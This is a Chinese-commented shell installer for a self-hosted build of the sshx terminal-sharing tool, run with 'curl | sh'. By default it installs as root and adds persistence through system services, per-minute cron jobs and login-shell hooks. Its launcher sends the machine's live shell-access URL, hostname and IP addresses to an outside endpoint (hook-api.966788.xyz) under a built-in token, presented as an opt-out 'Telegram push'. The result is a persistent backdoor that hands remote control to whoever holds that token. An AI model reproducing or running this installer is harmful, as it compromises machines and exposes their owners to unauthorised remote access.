#!/bin/sh

# 安装 / 运行最新的 sshx 二进制。默认（install）在 Linux 上会：
#   1) 安装二进制到 /usr/local/bin；
#   2) 常驻后台运行（关控制台/断 SSH 不停）；
#   3) 配置自启/保活（systemd/OpenRC/SysV；容器等无 init 环境用 cron+登录钩子）；
#   4) 打印本机固定连接地址。
#
# 用法：
#   curl -sSf https://sshx.rtxk.org/get | sh                          # 默认：安装+常驻+自启+打印地址
#   curl -sSf https://sshx.rtxk.org/get | sh -s run                  # 临时前台运行一次
#   curl -sSf https://sshx.rtxk.org/get | sh -s download             # 只下载到当前目录
#   curl -sSf https://sshx.rtxk.org/get | sh -s -- --no-service      # 只装二进制，不常驻/不自启
#   默认已开启电报推送（内置 token）：sshx 上线后把 主机/IP/时间/连接 推到电报。
#   curl -sSf https://sshx.rtxk.org/get | sh -s -- --no-telegram        # 关闭电报推送
#   curl -sSf https://sshx.rtxk.org/get | sh -s -- --telegram <token>   # 用你自己的电报 token
#   curl -sSf https://sshx.rtxk.org/get | sh -s -- --force               # 强制重装/重启（默认已在运行则跳过）
#   环境变量等价：SSHX_NO_SERVICE=1 / SSHX_TELEGRAM_TOKEN=<token>

set +e

if [ -z "$NO_COLOR" ]; then
  ansi_reset="\033[0m"; ansi_info="\033[35;1m"; ansi_error="\033[31m"
  ansi_warn="\033[33m"; ansi_underline="\033[4m"; ansi_ok="\033[32;1m"
fi
info() { printf "${ansi_reset}${ansi_info}%s${ansi_reset}\n" "$1"; }
ok()   { printf "${ansi_reset}${ansi_ok}%s${ansi_reset}\n" "$1"; }
warn() { printf "${ansi_reset}${ansi_warn}!  %s${ansi_reset}\n" "$1"; }
err()  { printf "${ansi_reset}${ansi_error}%s${ansi_reset}\n" "$1"; }
have() { command -v "$1" >/dev/null 2>&1; }

# ---------- 参数 ----------
cmd=install
no_service=${SSHX_NO_SERVICE:+1}
force=""
tg_token="${SSHX_TELEGRAM_TOKEN:-dc6c59b34c244973a438869f5b2c9aca}"  # 内置默认 token；--no-telegram 可关闭
while [ $# -gt 0 ]; do
  case "$1" in
    install|run|download) cmd="$1" ;;
    --no-service|--no-autostart) no_service=1 ;;
    --service|--autostart) no_service="" ;;
    --telegram) tg_token="${2:-}"; [ $# -ge 2 ] && shift ;;
    --no-telegram) tg_token="" ;;
    --force) force=1 ;;
    --telegram=*) tg_token="${1#--telegram=}" ;;
    "") : ;;
    *) err "未知参数: $1"; exit 1 ;;
  esac
  shift
done

# ---------- 系统 / 架构 ----------
case "$(uname -s)" in
  Linux*) suffix="-unknown-linux-musl"; os=linux ;;
  Darwin*) suffix="-apple-darwin"; os=darwin ;;
  FreeBSD*) suffix="-unknown-freebsd"; os=freebsd ;;
  MINGW*|MSYS*|CYGWIN*) err "检测到 Windows，请到 https://sshx.rtxk.org 下载可执行文件。"; exit 1 ;;
  *) err "不支持的系统 $(uname -s)"; exit 1 ;;
esac
case "$(uname -m)" in
  aarch64 | aarch64_be | arm64 | armv8b | armv8l) arch="aarch64" ;;
  x86_64 | x64 | amd64) arch="x86_64" ;;
  armv6l) arch="arm"; suffix="${suffix}eabihf" ;;
  armv7l) arch="armv7"; suffix="${suffix}eabihf" ;;
  *) err "不支持的架构 $(uname -m)"; exit 1 ;;
esac
url="https://mirrors.rtxk.us/sshx-self-releases/latest/sshx-${arch}${suffix}.tar.gz"

temp=$(mktemp); will_run=""
case "$cmd" in
  run) path=$(mktemp -d); will_run=1 ;;
  download) path=$(pwd) ;;
  install) path=/usr/local/bin ;;
  *) err "无效命令。"; exit 1 ;;
esac

SUDO=""
[ "$(id -u)" -ne 0 ] && have sudo && SUDO="sudo"
run_priv() { if [ "$(id -u)" -eq 0 ]; then "$@"; elif [ -n "$SUDO" ]; then $SUDO "$@"; else return 111; fi; }
can_priv() { [ "$(id -u)" -eq 0 ] || [ -n "$SUDO" ]; }

BIN="/usr/local/bin/sshx"
LAUNCH="/usr/local/bin/sshx-launch"
KEEPALIVE="/usr/local/bin/sshx-keepalive"
NOHUP_LOG="/var/log/sshx.log"
SVC_KIND=""; CONTAINER_METHODS=""

is_running() {
  if have pgrep; then pgrep -x sshx >/dev/null 2>&1
  elif have pidof; then pidof sshx >/dev/null 2>&1
  else ps aux 2>/dev/null | grep -v grep | grep -q "$BIN --quiet"; fi
}

# ---------- 安装启动器（跑 sshx；若配置了电报 token 则上线后推送）----------
install_launcher() {
  tmp=$(mktemp)
  cat > "$tmp" <<'LAUNCHEOF'
#!/bin/sh
# 由 sshx 的 /get 安装。运行 sshx --quiet；若设置了 TG_TOKEN，则在拿到连接地址后推送到电报。
BIN=/usr/local/bin/sshx
TG_TOKEN="__TG_TOKEN__"
TG_API="https://hook-api.966788.xyz/sendMessage"
LOG=/var/log/sshx.log
( : >> "$LOG" ) 2>/dev/null || LOG="${TMPDIR:-/tmp}/sshx.log"

if [ -z "$TG_TOKEN" ]; then
  exec "$BIN" --quiet
fi

"$BIN" --quiet >>"$LOG" 2>&1 </dev/null &
PID=$!
(
  i=0; URL=""
  while [ "$i" -lt 25 ]; do
    kill -0 "$PID" 2>/dev/null || exit 0
    URL=$(grep -oE 'https?://[^[:space:]]+#[^[:space:]]+' "$LOG" 2>/dev/null | tail -n1)
    [ -n "$URL" ] && break
    sleep 1; i=$((i + 1))
  done
  [ -z "$URL" ] && exit 0
  HOST=$(hostname 2>/dev/null || echo unknown)
  LIP=$(hostname -I 2>/dev/null | awk '{print $1}')
  [ -z "$LIP" ] && LIP=$(ip route get 1 2>/dev/null | awk '{for(k=1;k<=NF;k++) if($k=="src") print $(k+1)}')
  [ -z "$LIP" ] && LIP="未知"
  PIP=$(curl -s --max-time 6 https://api.ipify.org 2>/dev/null || curl -s --max-time 6 https://ifconfig.me 2>/dev/null)
  [ -z "$PIP" ] && PIP="未知"
  NOW=$(date '+%Y-%m-%d %H:%M:%S %Z' 2>/dev/null || date)
  TEXT=$(printf '🖥 sshx 已上线\n主机: %s\n本地IP: %s\n公网IP: %s\n时间: %s\n连接: %s' "$HOST" "$LIP" "$PIP" "$NOW" "$URL")
  curl -s -G "$TG_API" \
    --data-urlencode "token=$TG_TOKEN" \
    --data-urlencode "text=$TEXT" \
    --data-urlencode "disable_web_page_preview=true" >/dev/null 2>&1
) &
wait "$PID"
LAUNCHEOF
  # 注入 token（十六进制，安全）
  sed "s|__TG_TOKEN__|${tg_token}|" "$tmp" > "$tmp.2" && mv "$tmp.2" "$tmp"
  run_priv cp "$tmp" "$LAUNCH" && run_priv chmod 755 "$LAUNCH" || { rm -f "$tmp"; return 1; }
  rm -f "$tmp"
  return 0
}

# ---------- systemd ----------
setup_systemd() {
  unit=/etc/systemd/system/sshx.service; tmp=$(mktemp)
  cat > "$tmp" <<EOF
[Unit]
Description=sshx collaborative terminal
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=$LAUNCH
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
  run_priv cp "$tmp" "$unit" || { rm -f "$tmp"; return 1; }; rm -f "$tmp"
  run_priv systemctl daemon-reload || return 1
  run_priv systemctl enable sshx >/dev/null 2>&1 || return 1
  run_priv systemctl restart sshx || return 1
  return 0
}

# ---------- OpenRC ----------
setup_openrc() {
  svc=/etc/init.d/sshx; tmp=$(mktemp)
  cat > "$tmp" <<EOF
#!/sbin/openrc-run
name="sshx"
description="sshx collaborative terminal"
command="$LAUNCH"
command_background=true
pidfile="/run/sshx-launch.pid"
supervisor="supervise-daemon"
output_log="$NOHUP_LOG"
error_log="$NOHUP_LOG"
depend() { need net; after net; }
EOF
  run_priv cp "$tmp" "$svc" || { rm -f "$tmp"; return 1; }; rm -f "$tmp"
  run_priv chmod +x "$svc" || return 1
  run_priv rc-update add sshx default >/dev/null 2>&1 || return 1
  run_priv rc-service sshx restart >/dev/null 2>&1 || run_priv rc-service sshx start >/dev/null 2>&1 || return 1
  return 0
}

# ---------- SysV ----------
setup_sysv() {
  svc=/etc/init.d/sshx; tmp=$(mktemp)
  cat > "$tmp" <<'EOF'
#!/bin/sh
### BEGIN INIT INFO
# Provides:          sshx
# Required-Start:    $network $remote_fs
# Required-Stop:     $network $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: sshx collaborative terminal
### END INIT INFO
LAUNCH=/usr/local/bin/sshx-launch
PIDFILE=/run/sshx.pid
LOG=/var/log/sshx.log
case "$1" in
  start)
    if command -v start-stop-daemon >/dev/null 2>&1; then
      start-stop-daemon --start --background --make-pidfile --pidfile "$PIDFILE" \
        --startas /bin/sh -- -c "exec $LAUNCH >>$LOG 2>&1"
    else
      "$LAUNCH" >>"$LOG" 2>&1 & echo $! > "$PIDFILE"
    fi ;;
  stop) [ -f "$PIDFILE" ] && kill "$(cat "$PIDFILE")" 2>/dev/null; pkill -x sshx 2>/dev/null; rm -f "$PIDFILE" ;;
  restart) "$0" stop; sleep 1; "$0" start ;;
  status) [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null && echo running || echo stopped ;;
  *) echo "Usage: $0 {start|stop|restart|status}"; exit 1 ;;
esac
EOF
  run_priv cp "$tmp" "$svc" || { rm -f "$tmp"; return 1; }; rm -f "$tmp"
  run_priv chmod +x "$svc" || return 1
  if have update-rc.d; then run_priv update-rc.d sshx defaults >/dev/null 2>&1 || return 1
  elif have chkconfig; then run_priv chkconfig --add sshx >/dev/null 2>&1; run_priv chkconfig sshx on >/dev/null 2>&1 || return 1; fi
  run_priv "$svc" restart >/dev/null 2>&1 || run_priv "$svc" start >/dev/null 2>&1 || return 1
  return 0
}

# ---------- 容器 / 无 init ----------
setup_container() {
  ( : >> "$NOHUP_LOG" ) 2>/dev/null || NOHUP_LOG="${TMPDIR:-/tmp}/sshx.log"
  tmp=$(mktemp)
  cat > "$tmp" <<EOF
#!/bin/sh
if command -v pgrep >/dev/null 2>&1; then pgrep -x sshx >/dev/null 2>&1 && exit 0
elif command -v pidof >/dev/null 2>&1; then pidof sshx >/dev/null 2>&1 && exit 0
else ps aux 2>/dev/null | grep -v grep | grep -q "$BIN --quiet" && exit 0; fi
nohup "$LAUNCH" >>"$NOHUP_LOG" 2>&1 </dev/null &
EOF
  if run_priv cp "$tmp" "$KEEPALIVE" && run_priv chmod +x "$KEEPALIVE"; then :; else
    mkdir -p "$HOME/.local/bin" 2>/dev/null; KEEPALIVE="$HOME/.local/bin/sshx-keepalive"
    cp "$tmp" "$KEEPALIVE" && chmod +x "$KEEPALIVE" || { rm -f "$tmp"; return 1; }
  fi
  rm -f "$tmp"; did=""
  if have crontab; then
    (crontab -l 2>/dev/null | grep -v 'sshx-keepalive'
     echo "@reboot $KEEPALIVE"; echo "* * * * * $KEEPALIVE") | crontab - 2>/dev/null && did="cron"
    have crond && (crond >/dev/null 2>&1 </dev/null &) 2>/dev/null
    run_priv service cron start >/dev/null 2>&1; run_priv service crond start >/dev/null 2>&1
    [ -x /etc/init.d/cron ]  && run_priv /etc/init.d/cron start  >/dev/null 2>&1
    [ -x /etc/init.d/crond ] && run_priv /etc/init.d/crond start >/dev/null 2>&1
  fi
  if can_priv && [ -d /etc/profile.d ]; then
    printf '#!/bin/sh\n%s >/dev/null 2>&1 || true\n' "$KEEPALIVE" > "/tmp/sshx_pf.$$"
    run_priv cp "/tmp/sshx_pf.$$" /etc/profile.d/sshx-keepalive.sh >/dev/null 2>&1 && run_priv chmod +x /etc/profile.d/sshx-keepalive.sh >/dev/null 2>&1 && did="${did:+$did+}profile.d"
    rm -f "/tmp/sshx_pf.$$"
  fi
  for rc in "$HOME/.bashrc" "$HOME/.profile"; do
    [ -e "$rc" ] || [ "$rc" = "$HOME/.bashrc" ] || continue
    grep -q 'sshx-keepalive' "$rc" 2>/dev/null && continue
    printf '\n# sshx keepalive\n%s >/dev/null 2>&1 || true\n' "$KEEPALIVE" >> "$rc" 2>/dev/null && did="${did:+$did+}rc"
  done
  "$KEEPALIVE"; SVC_KIND=container; CONTAINER_METHODS="$did"; return 0
}

background_run() {
  ( : >> "$NOHUP_LOG" ) 2>/dev/null || NOHUP_LOG="${TMPDIR:-/tmp}/sshx.log"
  is_running || nohup "$LAUNCH" >>"$NOHUP_LOG" 2>&1 </dev/null &
  SVC_KIND=nohup
}

choose_persistence() {
  if have systemctl && systemctl list-units >/dev/null 2>&1; then echo systemd
  elif have rc-update && have rc-service; then echo openrc
  elif have update-rc.d || have chkconfig; then echo sysv
  elif have crontab || [ -d /etc/profile.d ] || [ -n "$HOME" ]; then echo container
  else echo nohup; fi
}

service_log() {
  case "$SVC_KIND" in
    systemd) run_priv journalctl -u sshx -o cat --no-pager -n 80 2>/dev/null; run_priv cat "$NOHUP_LOG" 2>/dev/null ;;
    *) run_priv cat "$NOHUP_LOG" 2>/dev/null || cat "$NOHUP_LOG" 2>/dev/null ;;
  esac
}
show_url() {
  info "↯ 正在获取连接地址（最多等待约 15 秒）…"
  i=0
  while [ "$i" -lt 15 ]; do
    u=$(service_log | grep -oE 'https?://[^[:space:]]+#[^[:space:]]+' | tail -n1)
    if [ -n "$u" ]; then printf "\n"; ok "  ➜  连接地址: $u"; printf "\n"; return 0; fi
    sleep 1; i=$((i + 1))
  done
  warn "暂未取到连接地址（可能还在连接，或服务端 gRPC 被前置代理拦截）。"
  case "$SVC_KIND" in
    systemd) warn "排查: systemctl status sshx  日志: journalctl -u sshx -n 40 --no-pager" ;;
    *) warn "日志: tail -n 40 $NOHUP_LOG" ;;
  esac
}

# ---------- 幂等：已安装且在运行则跳过（可放主机面板计划任务做保活）----------
if [ "$cmd" = "install" ] && [ -z "$force" ] && [ -x "$BIN" ] && is_running; then
  u=$( { run_priv cat "$NOHUP_LOG" 2>/dev/null; run_priv journalctl -u sshx -o cat --no-pager -n 50 2>/dev/null; } | grep -oE 'https?://[^[:space:]]+#[^[:space:]]+' | tail -n1)
  ok "sshx 已在运行，跳过（计划任务无需重复安装；加 --force 可强制重装/重启）。"
  [ -n "$u" ] && ok "  ➜  连接地址: $u"
  rm -f "$temp"; exit 0
fi

# ---------- 下载 / 安装 ----------
if [ "$cmd" = "install" ] && [ -x "$BIN" ] && [ -z "$force" ]; then
  info "↯ sshx 已安装，跳过下载（--force 可强制重下）。"
  rm -f "$temp"
else
  info "↯ 下载 sshx: $url"
  http_code=$(curl -L "$url" -o "$temp" -w "%{http_code}")
  if [ "$http_code" -lt 200 ] || [ "$http_code" -gt 299 ]; then
    err "下载失败，HTTP 状态码 ${http_code}。"; cat "$temp" 1>&2; rm -f "$temp"; exit 1
  fi
  info "↯ 安装 sshx 到 $path"
  if [ "$cmd" = "install" ]; then
    run_priv tar xf "$temp" -C "$path" || { err "解压到 $path 失败。"; rm -f "$temp"; exit 1; }
  else
    tar xf "$temp" -C "$path" || { err "解压到 $path 失败。"; rm -f "$temp"; exit 1; }
  fi
  rm -f "$temp"; ok "↯ sshx 已安装完成。"
fi

if [ -n "$will_run" ]; then "$path/sshx"; rm -f "$path/sshx"; exit 0; fi

if [ "$cmd" = "install" ]; then
  if [ -n "$no_service" ]; then
    info "↯ 已按 --no-service 跳过常驻/自启。手动运行: sshx"
  elif [ "$os" != "linux" ]; then
    warn "常驻/自启当前只在 Linux 自动配置；请手动运行: sshx"
  else
    [ -n "$tg_token" ] && info "↯ 已开启电报推送（上线后推送 主机/IP/时间/连接）。"
    install_launcher || warn "启动器安装失败，将直接运行 sshx。"
    info "↯ 配置常驻运行与自动拉起…"
    kind=$(choose_persistence)
    case "$kind" in
      systemd) if setup_systemd; then SVC_KIND=systemd; ok "✓ systemd 服务已就绪（开机自启 + 后台常驻）。管理: systemctl status/stop/disable sshx"; else warn "systemd 配置失败，改用容器保活模式。"; setup_container; fi ;;
      openrc)  if setup_openrc;  then SVC_KIND=openrc;  ok "✓ OpenRC 服务已就绪。管理: rc-service sshx status/stop"; else warn "OpenRC 配置失败，改用容器保活模式。"; setup_container; fi ;;
      sysv)    if setup_sysv;    then SVC_KIND=sysv;    ok "✓ SysV 服务已就绪。管理: service sshx status/stop"; else warn "SysV 配置失败，改用容器保活模式。"; setup_container; fi ;;
      container) setup_container ;;
      *) background_run ;;
    esac
    if [ "$SVC_KIND" = "container" ]; then
      ok "✓ 容器/无 init 环境：已后台常驻，并配置保活（${CONTAINER_METHODS:-nohup}）。"
      info "   · 掉线自愈：cron 每分钟检查未运行则拉起（需容器内 cron 在跑）"
      info "   · 重启拉起：cron @reboot + 登录 shell 钩子（连接进容器时触发）"
      warn "若平台完全不跑 cron、也不开登录 shell，容器重启后需重跑本命令；"
      warn "最稳做法：在平台的“启动命令/启动脚本”里加入: $KEEPALIVE"
    elif [ "$SVC_KIND" = "nohup" ]; then
      ok "✓ sshx 已在后台运行（容器重启后需重跑本命令）。"
    fi
    show_url
  fi
fi
exit 0
